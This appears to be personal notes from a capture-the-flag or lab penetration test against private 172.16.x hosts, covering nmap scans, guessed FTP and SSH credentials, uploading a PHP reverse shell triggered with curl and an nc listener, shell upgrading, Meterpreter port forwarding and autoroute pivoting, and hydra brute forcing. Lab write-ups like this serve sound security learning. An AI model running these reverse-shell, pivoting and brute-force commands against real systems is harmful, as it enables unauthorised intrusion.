Nmapped the network. Took super long (Like 1h+)
Used the settings -sV -p- -Pn -T3

# 234

Googling reveals a metasploit vulnerability, which i used
 - https://www.google.com/search?q=proftpd+metasploit+1.3.0&sxsrf=AOaemvLubYjvcWN6AOGMWkT82SBwBHr78g%3A1630232210715&ei=kl4rYfGRK9uS9QOlsLmACw&oq=proftpd+metasploit+1.3.0&gs_lcp=Cgdnd3Mtd2l6EAMyBQghEKABOgcIABBHELADOgYIABAWEB5KBAhBGABQ_T9Y9UhgzkpoAXACeACAAXSIAZEDkgEDNS4xmAEAoAEByAEIwAEB&sclient=gws-wiz&ved=0ahUKEwjxosiegNbyAhVbSX0KHSVYDrAQ4dUDCA8&uact=5 
 - But failed
 
 Managed to guess the password to the service, and download the flag.txt

The archive also stores the html files, which are essentially useless. the xyz/index.php shows the ifconfig command
 - You can also dirb to get it
 
 Use ftp to upload php reverse shell payload, and after that upgrade shell and su into ftpuser with password ftpuser (guessed it)
 Somehow ftpuser is root.
- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Total Steps
```
curl http://172.16.37.234:40180/payload.php & nc -nlvp 1234  
python -c 'import pty; pty.spawn("/bin/bash")'
su ftpuser
ftpuser

```


After that I enum and found out you can access some services from the device. 
Opened a meterpreter shell, port forwarded and accessed machine 1's web server.
 - https://null-byte.wonderhowto.com/how-to/elevate-netcat-shell-meterpreter-session-for-more-power-control-0193211/
 - http://blog.safebuff.com/2017/01/02/Meterpreter-Proxy-and-Route/
```
portfwd add -l 8080 -p 80 -r 172.16.37.1
portfwd add -l 8022 -p 22 -r 172.16.37.1
```

On `xyz/index.php`, found out that there's an additional network interface that we can add
```
run autoroute -s 172.16.50.0/24
```

## 220

Checking /index.php reveals that it's IP address in the pivoted network is `172.16.50.222`

Just used hydra to crack into the ssh as root (as hinted by the given info), username and password is `root`

SSHed in and got the flag

# 1

```
root@xubuntu:~# nmap -sV 172.16.37.1

Starting Nmap 7.01 ( https://nmap.org ) at 2021-09-01 16:21 UTC
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 172.16.37.1
Host is up (0.00011s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)
80/tcp open  http    nginx
MAC Address: 00:50:56:A2:16:F9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
```

Got the pfSense webpage.

from metasploit testing, found out its pfSense 2.4.2-RELEASE

Tried bruteforcing ssh login (and then got locked out of the firewall so RIP)
https://v3ded.github.io/ctf/htb-sense

dirb showed xmlrpc.php at the root
 - https://github.com/pfsense/pfsense/blob/master/src/usr/local/www/xmlrpc.php


# Overall

Turns out I solved it entirely on my own? Nani? Interesting
About 12h? Broken up into pieces though. Also a lot of time waiting for enumeration and learning.
